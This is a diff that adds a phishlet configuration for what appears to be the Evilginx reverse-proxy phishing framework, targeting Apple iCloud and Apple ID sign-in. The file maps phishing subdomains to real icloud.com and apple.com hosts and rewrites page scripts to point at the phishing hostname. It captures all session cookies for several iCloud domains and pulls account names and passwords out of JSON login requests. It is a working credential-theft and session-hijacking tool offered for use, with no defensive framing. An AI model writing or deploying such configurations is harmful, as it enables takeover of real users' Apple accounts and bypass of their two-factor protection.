@@ -1,0 +1,51 @@
+author: '@S19h4c3r'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true}
+  - {phish_sub: 'apple', orig_sub: 'www', domain: 'apple.com', session: true, is_landing: false}
+  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: true, is_landing: false}
+  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false}
+  - {phish_sub: 'snapengage', orig_sub: 'www', domain: 'snapengage.com', session: false, is_landing: false}  
+  - {phish_sub: 'idmsa', orig_sub: 'idmsa', domain: 'apple.com', session: true, is_landing: false}  
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple-cloudkit.com', session: false, is_landing: false}
+  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: false, is_landing: false}
+  - {phish_sub: 'ckdatabasews', orig_sub: 'ckdatabasews', domain: 'icloud.com', session: false, is_landing: false}
+
+sub_filters:
+ - {triggers_on: 'www.icloud.com/appleauth/static/jsapi/authService.latest.min.js', orig_sub: 'www', domain: 'icloud.com', search: '"icloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: '"icloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+ - {triggers_on: 'www.icloud.com/ck/2/cloudkit.js', orig_sub: 'www', domain: 'icloud.com', search: '"icloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: '"icloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+ - {triggers_on: 'www.icloud.com/system/cloudos2/2007Hotfix35/en-us/main.js', orig_sub: 'www', domain: 'icloud.com', search: '"icloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: '"icloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+ - {triggers_on: 'www.icloud.com/system/cloudos2/2007Hotfix35/en-us/main.js', orig_sub: 'www', domain: 'icloud.com', search: '"iCloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: '"iCloud.com"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+ - {triggers_on: 'www.icloud.com/system/cloudos2/2007Hotfix35/en-us/main.js', orig_sub: 'www', domain: 'icloud.com', search: '"icloud.com.cn"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ - {triggers_on: 'www.icloud.com', orig_sub: '', domain: 'icloud.com', search: '"icloud.com.cn"', replace: '"{hostname}"', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+ - domain: '.icloud.com'
+   keys: ['.*,regexp']
+ - domain: 'www.icloud.com'
+   keys: ['.*,regexp']
+ - domain: 'setup.icloud.com'
+   keys: ['.*,regexp']
+ - domain: 'idmsa.icloud.com'
+   keys: ['.*,regexp']
+credentials:
+ username:
+  key: ''
+  search: '"accountName":"([^"]*)'
+  type: 'json'
+ password:
+  key: ''
+  search: '"password":"([^"]*)'
+  type: 'json'
+login:
+  domain: 'www.icloud.com'
+  path: ''
